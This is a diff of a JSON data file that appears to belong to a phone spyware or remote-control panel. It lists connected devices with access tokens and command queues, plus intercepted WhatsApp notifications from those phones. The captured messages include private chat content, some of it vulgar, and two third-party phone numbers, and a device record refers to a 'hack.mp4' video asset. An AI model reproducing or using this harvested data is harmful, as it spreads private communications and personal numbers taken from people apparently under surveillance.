@@ -22,6 +22,38 @@
     "smsMessages": [
       {
         "appName": "WhatsApp",
+        "sender": "‎𝟐𝟐𝟓 𝐀𝐑𝐄𝐀 (157 pesan): ~ idk",
+        "content": "bukan saiank disitu ad princes.",
+        "time": "29/04 21:55",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1777470269416
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "‎‎1878 pesan dari 21 chat",
+        "time": "29/04 21:55",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1777470269397
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "‎𝘼𝙈𝘽𝘼𝙇𝙄𝙂𝙃𝙏𝙉𝙄𝙉𝙂⚡ (273 pesan): ~ sasa wangsaf",
+        "content": "pacaran yok",
+        "time": "29/04 21:55",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1777470260957
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "‎𝐒𝐓𝐌 𝐒𝐔𝐒𝐔 𝐃𝐀𝐍𝐂𝐀𝐖𝟕𝟕𝟕 ᵛ¹ (249 pesan): ~ Lan♿",
+        "content": "iya jink kalo itu kaga percaya gw ngentod logika aja anjg yang buat video porno ngelaporin orang yang asal sedangkan SK dia udh di mana mana logika aja jink😭😭",
+        "time": "29/04 21:55",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1777470259650
+      },
+      {
+        "appName": "WhatsApp",
         "sender": "WhatsApp",
         "content": "‎‎1876 pesan dari 21 chat",
         "time": "29/04 21:55",
@@ -3987,38 +4019,6 @@
         "time": "29/04 21:49",
         "pkg": "com.whatsapp",
         "receivedAt": 1777469911246
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "WhatsApp",
-        "content": "‎‎1705 pesan dari 21 chat",
-        "time": "29/04 21:49",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1777469909721
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎𝐒𝐓𝐌 𝐒𝐔𝐒𝐔 𝐃𝐀𝐍𝐂𝐀𝐖𝟕𝟕𝟕 ᵛ¹ (200 pesan): ~ Lan♿",
-        "content": "① Foto",
-        "time": "29/04 21:49",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1777469909691
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎Pegasus-X Room (2 pesan): ~ kii",
-        "content": "ada ni bang",
-        "time": "29/04 21:49",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1777469908504
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎𝐒𝐓𝐌 𝐒𝐔𝐒𝐔 𝐃𝐀𝐍𝐂𝐀𝐖𝟕𝟕𝟕 ᵛ¹ (199 pesan): ~ Kenon Anj",
-        "content": "📷 NO CEWENYA: +62 838-9353-9386\nNO COWONYA: +62 831-4252-6753",
-        "time": "29/04 21:49",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1777469907584
       }
     ],
     "galleryPhotos": [],
@@ -4069,7 +4069,7 @@
     "deviceName": "HP-AGUSGANTENG123-3E9A",
     "ownerUsername": "zaa",
     "token": "20fdcadc903f75b92eda3edefa92e509",
-    "lastSeen": 1777470257640,
+    "lastSeen": 1777470269274,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-27T07:37:12.639Z",
@@ -17949,7 +17949,7 @@
     "deviceName": "HP-ZAL7SEX-5D7C",
     "ownerUsername": "Zal7Sex",
     "token": "b806a84b0d2764047b5cb1e5906b7b55",
-    "lastSeen": 1777470256772,
+    "lastSeen": 1777470268792,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-29T13:43:11.417Z",
@@ -17975,10 +17975,6 @@
     "audioList": [],
     "lastAppUsage": null,
     "appList": null,
-    "pendingVideo": {
-      "assetPath": "assets/video/hack.mp4",
-      "mimeType": "video/mp4",
-      "startedAt": 1777470238346
-    }
+    "pendingVideo": null
   }
 ]
